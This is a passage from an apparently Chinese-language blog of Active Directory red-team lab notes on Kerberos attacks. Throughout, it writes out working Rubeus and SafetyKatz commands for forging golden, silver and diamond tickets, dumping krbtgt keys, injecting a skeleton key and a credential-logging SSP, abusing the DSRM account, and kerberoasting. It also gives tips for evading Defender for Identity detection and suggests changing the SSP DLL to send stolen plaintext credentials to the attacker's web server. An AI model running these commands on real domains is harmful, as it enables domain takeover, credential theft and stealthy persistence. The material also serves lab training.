<p>在上述执行拿到域管的cmd之后，执行 <code>whoami</code> 查看会发现并不是 <code>svcamin</code>, 这是因为logon type 9，只有访问远程资源时才会调用新票据，比如通过当前cmd进程执行 <code>winrs</code> 访问<code>dc</code></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="literal">-r</span>:dcorp<span class="literal">-dc</span> cmd /c <span class="built_in">set</span> username</span><br></pre></td></tr></table></figure>

<h2 id="09-kerberos"><a href="#09-kerberos" class="headerlink" title="09 kerberos"></a>09 kerberos</h2><h3 id="1-PAC"><a href="#1-PAC" class="headerlink" title="1.PAC"></a>1.PAC</h3><p><code>AP-req</code>，在服务端收到客户端的st之后，如果DC配置了开启了PAC校验，<code>service</code> 则会发送PAC给DC校验PAC中权限，这通常是不开启的。</p>
<p>PAC中包含了这个用户于TGS中所声称的用户的信息。</p>
<h3 id="2-Golden-Ticket"><a href="#2-Golden-Ticket" class="headerlink" title="2.Golden Ticket"></a>2.Golden Ticket</h3><p>因为<code>AS-REP</code>返回给客户端的TGT中加密的部分，使用的是 <code>krbtgt</code> 的凭据key来进行加密。</p>
<p>所以在响应 <code>TGS-REQ</code> 时，<code>DC</code> 验证票据主要是看 <code>krbtgt</code> 的凭据是否能成功解密，并获取客户端的 <code>TGT</code> 中加密部分的内容。</p>
<p>也就是说，可以通过获取 <code>krbtgt</code> 的key，来伪造一个包含了我们伪造的目标用户信息 <code>TGT</code> ，用于在 <code>TGS-REQ</code> 时，被 <code>DC</code> 能供成功解析。</p>
<p>通过这种方式来伪造任意用户的 <code>TGS-REQ</code> ，可进行获取任意用户的任意服务票据。</p>
<p>获取 <code>krbtgt</code> 凭据的方式</p>
<p>1.在DC上以域管理员（DA）身份执行mimikatz 导出凭证，但是这样只会得到得到RC4(htlm)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\SafetyKatz.exe <span class="string">&#x27;&quot;lsadump::lsa /patch&quot;&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>2.具有DCSync权限，可以导出aeskey</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\SafetyKatz.exe <span class="string">&#x27;&quot;lsadump::dcsyn /user:dcorp\krbtgt &quot; &quot;exit&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>krbtgt 有密码记录，如果提交TGT而KDC无法使用当前密码解密，那他就会尝试上一个密码。</p>
<h4 id="利用金票："><a href="#利用金票：" class="headerlink" title="利用金票："></a>利用金票：</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Rubeus.exe golden /aes256:xxxxxxxxx /sid:&lt;domain<span class="literal">-Sid</span>&gt; /ldap /user:Administrator /printcmd</span><br></pre></td></tr></table></figure>

<p>本实验室里用 <code>loader</code> 加载 <code>Safetykatz</code> 的话用下面这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Loader.exe -path http://127.0.0.1/Rubeus.exe -args evasive-golden /aes256:xxxxxxx /sid:&lt;domain-Sid&gt; /ldap /user:Administrator /printcmd</span><br></pre></td></tr></table></figure>

<p>然后根据输出的命令，在后面添加添加 <code>/ptt</code> 再次执行，在当前会话中注入票据，即可。</p>
<p>请注意，使用这段请求金票时，将会向DC发送3个LDAP查询请求：</p>
<ul>
<li>获取<code>/user</code> 中指定的flag （比如这里的administrator）</li>
<li>检索<code>/groups</code>,<code>/pgid</code>,<code>/minipassage</code>,<code>/maxpassage</code></li>
<li>检索当前域的<code>/netbios</code></li>
</ul>
<p>如果已经枚举了上述值或能添加更多值，则建议在打造金票时指定，这更有利于隐蔽。</p>
<h3 id="3-silver-Ticket"><a href="#3-silver-Ticket" class="headerlink" title="3.silver Ticket"></a>3.silver Ticket</h3><p>MDI对银票的检测宽容度非常高，即便是用域控(DC)机器账户伪造下发银票，mdi也不会管。</p>
<p><strong>Kerberos流程中最后部分 可选的PAC鉴权选项 会使这个票据失效，因为最后service还需要拿着st中的PAC交由dc验证，如果dc发现pac中的信息和对st发起请求的客户端不匹配，则G了</strong></p>
<h4 id="1-利用银票"><a href="#1-利用银票" class="headerlink" title="1.利用银票"></a>1.利用银票</h4><p>Rubeus</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:xxxxxxxxxxxx /sid:&lt;domain-sid&gt; /user:Administrator /ldap /domain:dollarcorp.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">https://adsecurity.org/?p=2011</a></p>
</blockquote>
<p>这里服务指定的是<code>http</code>，<code>http</code> 的 st 可以访问的资源比如 <code>WinRM</code>、<code>Winrs</code>等走http的鉴权访问资源。</p>
<p><code>Host</code> 的service则可以做  <code>计划任务（Scheduled Tasks）</code>、<code>本地资源</code> 、<code>WMI</code> 等访问。</p>
<p><code>RPCSS</code> 则是对主机发起 <code>RPCSS</code> 的访问，相比于 <code>Host</code> 的基础上多了访问 <code>COM</code> 和 远程管理服务等。</p>
<p>以上两种都可以执行 <code>WMI</code>（或者需要两种） ，WMI背后的服务是 <code>rpc</code> 和 <code>DCOM</code></p>
<p>用wmi执行命令的话可以酱紫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c whoami&quot; -ComputerName dcorp-dc</span><br></pre></td></tr></table></figure>

<p>看不到回显的话把命令回显可以写入到一个wmi能读取的地方，然后再查看回显</p>
<p>比如注册表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-Name</span> Create <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-ArgumentList</span> <span class="string">&#x27;cmd.exe /c for /f &quot;usebackq delims=&quot; %i in (&quot;C:\Windows\Temp\out.txt&quot;) do reg add &quot;HKLM\SOFTWARE\TempKey&quot; /v Who /t REG_SZ /d &quot;%i&quot; /f&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS          : <span class="number">2</span></span><br><span class="line">__CLASS          : __PARAMETERS</span><br><span class="line">__SUPERCLASS     :</span><br><span class="line">__DYNASTY        : __PARAMETERS</span><br><span class="line">__RELPATH        :</span><br><span class="line">__PROPERTY_COUNT : <span class="number">2</span></span><br><span class="line">__DERIVATION     : &#123;&#125;</span><br><span class="line">__SERVER         :</span><br><span class="line">__NAMESPACE      :</span><br><span class="line">__PATH           :</span><br><span class="line">ProcessId        : <span class="number">1468</span></span><br><span class="line">ReturnValue      : <span class="number">0</span></span><br><span class="line">PSComputerName   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$reg</span> = [<span class="type">Microsoft.Win32.RegistryKey</span>]::OpenRemoteBaseKey(<span class="string">&#x27;LocalMachine&#x27;</span>, <span class="string">&#x27;dcorp-dc&#x27;</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$key</span> = <span class="variable">$reg</span>.OpenSubKey(<span class="string">&#x27;SOFTWARE\TempKey&#x27;</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$key</span>.GetValue(<span class="string">&#x27;Who&#x27;</span>)</span><br><span class="line">dcorp\administrator</span><br></pre></td></tr></table></figure>

<p><code>CIFS</code> 文件共享服务，比如 <code>smb</code> </p>
<p><strong><code>LDAP</code> 则是 <code>dcsync</code>等。</strong></p>
<p>于实验室中使用 <code>Loader.exe</code> 执行 <code>Rubeus</code> 伪造银票则是如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\Loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>/Rubeus.exe <span class="literal">-args</span> evasive<span class="literal">-silver</span> /service:http/dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /rc4:xxxxxxxxxxxx /sid:S<span class="literal">-1-5-21-xxxxxx-xxxxxx-xxxxxx</span> /domain:dollarcorp.moneycorp.local /user:Administator /ldap /ptt</span><br></pre></td></tr></table></figure>

<p>清理票据:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge </span><br></pre></td></tr></table></figure>

<p>列出票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe klist</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>

<h3 id="4-Diamond-Ticket"><a href="#4-Diamond-Ticket" class="headerlink" title="4.Diamond Ticket"></a>4.Diamond Ticket</h3><p>回顾金票所产生的环节。</p>
<p>金票是直接通过 <code>krbtgt</code> 的 <code>aeskey</code> ，来打造一个现成的TGT注入到进程中。</p>
<p>这使得他没有 <code>as-req</code> <code>as-rep</code> 的环节，也自然缺少了两个环节对应的日志。</p>
<p>那钻石票就是为了解决这个问题，他是在正常正常流程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as-req -&gt; as-rep</span><br></pre></td></tr></table></figure>

<p>客户端获取TGT后，用 <code>krbtgt aeskey</code> 对TGT的加密部分进行解密，然后修改为我们所需的权限，再用 <code>krbtgt aeskey</code> 重新加密包装，这即是 <code>Diamond Ticket</code>。</p>
<p>把 <code>as-req</code> 返回的 tgt 视为一个盒子，用 <code>krbtgt aeskey</code> 打开盒子 然后修改里面的内容，再用它重新打包，发给DC。</p>
<p>说白了就是一个TGT的重包装。</p>
<p>钻石票据不仅比金票更隐蔽更安静，但前提也是要先有 <code>krbtgt aeskey</code></p>
<p>特点：</p>
<ul>
<li>更隐蔽</li>
<li>生命周期取决于krbtgt，只要 krbtgt 的 hash 没变，就可以一直伪造或修改票据</li>
</ul>
<h4 id="1-利用钻石票"><a href="#1-利用钻石票" class="headerlink" title="1.利用钻石票"></a>1.利用钻石票</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:&lt;krbtgt<span class="literal">-aeskey</span>&gt; /user:student1 /password:password@<span class="number">123</span> /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /ticketuserid:<span class="number">500</span> /groups:<span class="number">512</span> /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<p>如果正在作为域用户访问，则可以通过使用 <code>/tgtdeleg</code> 选项来传递当前账户凭据(省了输入账户密码了)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe diamond /krbkey:&lt;krbtgt<span class="literal">-aeskey</span>&gt; /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /trickeruserid:<span class="number">500</span> /groups:<span class="number">512</span> /createnetonly:C:\windows\system32\cmd.exe /show /ptt</span><br></pre></td></tr></table></figure>

<h3 id="5-Skeleton-key"><a href="#5-Skeleton-key" class="headerlink" title="5.Skeleton key"></a>5.Skeleton key</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/persistence/skeleton-key/">https://www.thehacker.recipes/ad/persistence/skeleton-key/</a></p>
</blockquote>
<p>通过patch lsass来实现，需要<code>dc</code> 的 <code>SeDebugPrivilege</code> 权限才可以，并且重启之后将会失效。</p>
<h4 id="1-注入万能钥匙"><a href="#1-注入万能钥匙" class="headerlink" title="1.注入万能钥匙"></a>1.注入万能钥匙</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe <span class="string">&#x27;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#x27;</span> <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span>.dollarcorp.local </span><br></pre></td></tr></table></figure>

<p>密码是 <code>mimikatz</code>，直接连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -Computername dcorp-dc -crendential dcorp\Administrator</span><br></pre></td></tr></table></figure>

<p>但是不建议用，因为如果角色位于注入万能钥匙的同一个域控上，ADCS的验证会出问题。</p>
<h3 id="6-DSRM"><a href="#6-DSRM" class="headerlink" title="6.DSRM"></a>6.DSRM</h3><p>目录服务还原模式 (DSRM) 是每个域控制器 (DC) 上用于恢复操作的一种特殊安全模式。</p>
<p>当域内机器提升为域控时，将会自动在本地创建一个 <code>Administrator</code> 本地的DSRM管理员账户，并设置DSRM密码，这个密码通常很少更新，隐蔽性比较高。</p>
<p>当能从域控导出 <code>sam hash</code> 时，可以检索到DSRM密码，如果需要远程登录这个账户的话需要修改注册表。</p>
<p>通过修改注册表 <code>HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code> 控制可使用 DSRM 帐户的条件:</p>
<ul>
<li>值 0（默认值）：仅当 DC 在 DSRM 中启动时，该帐户才可用。</li>
<li>值 1：本地 AD DS 服务停止时允许 DSRM 凭据。</li>
<li>值 2：允许始终使用 DSRM 凭据，包括通过网络。</li>
</ul>
<p>通过利用这些配置，攻击者可以利用 DSRM 帐户长期访问 DC，而无需域凭据。</p>
<h4 id="1-获取DSRM凭据"><a href="#1-获取DSRM凭据" class="headerlink" title="1.获取DSRM凭据"></a>1.获取DSRM凭据</h4><p>提取dsrm账户凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot;</span><br></pre></td></tr></table></figure>

<p>将导出的管理员hash与下面这个命令得到的管理员hash进行比较</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SafetyKatz.exe &quot;lsadump::lsa /patch&quot;</span><br></pre></td></tr></table></figure>

<p>第一个命令得到的是DSRM管理员密码</p>
<h4 id="2-利用DSRM管理员账户"><a href="#2-利用DSRM管理员账户" class="headerlink" title="2.利用DSRM管理员账户"></a>2.利用DSRM管理员账户</h4><p>因为通常情况下DSRM管理员账户无法直接使用，但是可以通过修改注册表 <code>HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</code> 使其可用。</p>
<p>用有权限修改dc注册表的账户先访问到dc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:dcorp-dc cmd</span><br></pre></td></tr></table></figure>

<p>修改注册表，允许DSRM管理员正常情况下从网络登录。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;DsrmAdminLogonBehavior&quot;</span> /t REG_DWORD /d <span class="number">2</span> /f</span><br></pre></td></tr></table></figure>

<p>正常mimikatz使用DSRM的ntlm凭据启动一个带凭据的cmd（注意DSRM与正常的pth不同，这里 <code>domain</code> 指向的不是域名，而是目前所用的DSRM的域控机器名）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="string">&quot;sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:xxxxxxxxxxxxxx /run:cmd&quot;</span></span><br></pre></td></tr></table></figure>

<p>因为使用ntlm和ip来进行远程到域控，所以需要将域控机器的ip加入到当前可信主机中</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-Item</span> WSMan:\localhost\Client\TrustedHosts <span class="number">172.16</span>.<span class="number">2.1</span>&lt;域控ip&gt;</span><br></pre></td></tr></table></figure>

<p>然后就可以用PSSession远程到域控，要注意这里ComputerName用的是IP，而Kerberos不认ip，所以这里是NTLM认证，然后鉴权使用 <code>NegotiateWithImplicitCredential</code> <em>(自动使用当前登录用户的凭据进行身份验证)</em></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> <span class="number">172.16</span>.<span class="number">2.1</span> <span class="literal">-Authentication</span> NegotiateWithImplicitCredential</span><br></pre></td></tr></table></figure>

<p>因为是用管理员账户本地登陆的，所以这里留下的日志也比较正常</p>
<p>4624（登录成功）、4634（退出）、4672（管理员登录）</p>
<h3 id="7-Custom-SSP"><a href="#7-Custom-SSP" class="headerlink" title="7.Custom SSP"></a>7.Custom SSP</h3><p>（SSP） Security Support Provider，ssp是一个安全支持服务，对应用提供身份认证的方式，他是一个允许身份验证的DLL库。</p>
<p>微软的ssp有：</p>
<ul>
<li>NTLM</li>
<li>Kerberos</li>
<li>Wdgiest</li>
<li>CredSSP</li>
</ul>
<p>如果对DC，以及其他机器有着管理权限，则可以为其注入自定义ssp。</p>
<p>比如mimikatz的ssp的dll，是将用户的明文凭证记录到一个日志中。</p>
<h4 id="1-利用方式"><a href="#1-利用方式" class="headerlink" title="1.利用方式"></a>1.利用方式</h4><p>1.把mimilib.dll放到主机 <code>/system32</code> 目录下后，修改注册表加载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSconfig\ -Name &#x27;Security Packages&#x27;| select -ExpandProperty &#x27;Security Packages&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$packages += &quot;mimilib&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSconfig\  -Name &#x27;Security Packages&#x27; -Value $packages</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name &#x27;Security Packages&#x27; -Value $packages</span><br></pre></td></tr></table></figure>

<p>2.直接用mimiktaz注入lsass （要注意这种方式在 winserver 2019和2022并不稳定）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Safetykatz.exe <span class="literal">-Command</span> <span class="string">&#x27;&quot;msic::memssp&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上述两种方式的log位置是 <code>C:\Windows\system32\mimilsa.log</code> </p>
<p>因为在dc上注入ssp要用域管理员权限，而访问他默认的log存储位置也需要管理权限，所以建议是对dll进一步修改，比如将获取到的凭证传输到自己的web服务器上之类，应当避免权限维持却还要需要再次利用高权的情况。</p>
<h3 id="8-kerberoasting"><a href="#8-kerberoasting" class="headerlink" title="8.kerberoasting"></a>8.kerberoasting</h3><p>这里严格来说分为两种，一种是用户预认证没关 <code>as-rep</code> 返回给的由用户密码加密的blob，还有一种是SPN是 <code>TGS-rep</code> 返还的服务st，两者一个是用用户的密码加密，一个是用服务账户的密码加密，所以可以通过字典来对票据爆破，能解密成功就代表拿到了对应的密码。</p>
<p>要注意的是，即便是受保护的用户或组，按道理不会使用aes加密，但却还是能允许被请求加密降级到RC4加密。</p>
<p>如果拿到hash之后跑john或者hashcat提示hash有问题，可以看下是不是有端口和特殊符号之类的手动去除一下。</p>
<h4 id="1-SPN"><a href="#1-SPN" class="headerlink" title="1.SPN"></a>1.SPN</h4><p>在进行kerberosating的过程中，应该注意避免同一时间对所有服务进行大批量请求，mdi将会检测到这种行为，或者发起请求加密降级也同样会触发告警。</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>筛选服务账户（带有spn不为空的）</p>
<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-ne</span> <span class="string">&quot;null&quot;</span>&#125; <span class="literal">-Properties</span> servicePrincipalName</span><br></pre></td></tr></table></figure>

<p>Powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainUser</span> <span class="literal">-SPN</span></span><br></pre></td></tr></table></figure>

<p>Rubeus</p>
<p>列出kerberoast可用统计</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /stats</span><br></pre></td></tr></table></figure>

<p>请求目标st</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /user:svcadmin /simple</span><br></pre></td></tr></table></figure>

<hr>
<p>为了避免 <a target="_blank" rel="noopener" href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/downgrade-attack/">加密降级检测</a> 还可以手动指定仅列出支持rc4算法的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /stats /rc4opsec </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec</span><br></pre></td></tr></table></figure>

<hr>
<p>如果没需求，可以直接请求获取所有spn的，输出到文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt</span><br></pre></td></tr></table></figure>
<hr>
<p>如果对一个账户有genricwrite权限或者别的能够编辑添加用户ldap属性的权限，则可以给一个账户配置一个SPN，这样就可以对他发起 <code>kerberoast</code></p>
<p>获取对于高价值用户的ACl，这里IdentityReferenceName为持有权限的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-InterestingdomainAcl</span> <span class="literal">-ResolveGUIDs</span> | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="operator">-match</span> <span class="string">&quot;RDPusers&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>查看账户是否配置了SPN</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainUser</span> <span class="literal">-Identity</span> supportuser |<span class="built_in">select</span> ServicePrincipalname</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject|?&#123;$_.servicePrincipalName -ne $null&#125;|%&#123;$n=$_.samAccountName;$_.servicePrincipalName|%&#123;[PSCustomObject]@&#123;SamAccountName=$n;ServicePrincipalName=$_&#125;&#125;&#125;|ft -AutoSize</span><br></pre></td></tr></table></figure>


<p>ad module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Identity</span> supportuser <span class="literal">-Properties</span> ServicePrincipalName |<span class="built_in">select</span> ServicePrincipalName</span><br></pre></td></tr></table></figure>

<p>没配的话给他配一下(注意在一个forest中，spn名必须是唯一的)</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-domainObject</span> <span class="literal">-Identity</span> supportuser <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;servicePrincipalname=<span class="string">&#x27;dcorp/whateverXD&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>ad module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> supportuser <span class="literal">-ServicePrincipalNames</span> <span class="selector-tag">@</span>&#123;Add=<span class="string">&quot;dcorp/whatever&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-AS-REProast"><a href="#2-AS-REProast" class="headerlink" title="2.AS-REProast"></a>2.AS-REProast</h4><p>由于一个账户关闭了预认证，所以以这个账户身份与dc发起 <code>as-req</code> 时，dc将会返回一个以用户的密码加密的blob。</p>
<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><p>获取域中没有开启预认证的账户。</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Domainuser</span> <span class="literal">-PreauthNotRequired</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;DoesNotRequirePreAuth <span class="operator">-eq</span> <span class="variable">$True</span>&#125; <span class="literal">-Properties</span> DoesNotRequirePreAuth </span><br></pre></td></tr></table></figure>

<hr>
<p>查询高价值ACL，如果对某个用户的UAC有修改权限，则可以帮他关闭预认证，然后roast尝试跑他的密码</p>
<p>比如这里筛选身份为 <code>RDPusers</code> 的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-InterestingdomainAcl</span> <span class="literal">-ResolveGUIDs</span> | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="operator">-match</span> <span class="string">&quot;RDPusers&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>然后找到一个，关闭它的预认证</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-domainObject</span> <span class="literal">-Identity</span> Control1User <span class="operator">-XOR</span> <span class="selector-tag">@</span>&#123;useraccountcontrol=<span class="number">4194304</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>获取域内没有开启预认证的账户，便能看到这个用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainUser</span> <span class="literal">-PreAuthNotRequired</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<hr>
<p>获取关闭预认证账户的blob</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /user:VPN1user /outfile:C:\windows\outfile.txt</span><br></pre></td></tr></table></figure>

<p>同样的，如果要获取所有的就不指定，但是要注意快速获取尝试所有用户的blob也同样会被检测到。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast </span><br></pre></td></tr></table></figure>

<p>然后跑就完事了</p>
<hr>
<h3 id="9-Kerberos-Delegation-（委派）"><a href="#9-Kerberos-Delegation-（委派）" class="headerlink" title="9.Kerberos Delegation （委派）"></a>9.Kerberos Delegation （委派）</h3><blockquote>
<p>重复使用用户的凭据来访问托管在不同服务器上的资源。</p>
</blockquote>
<p>比较常见的是</p>
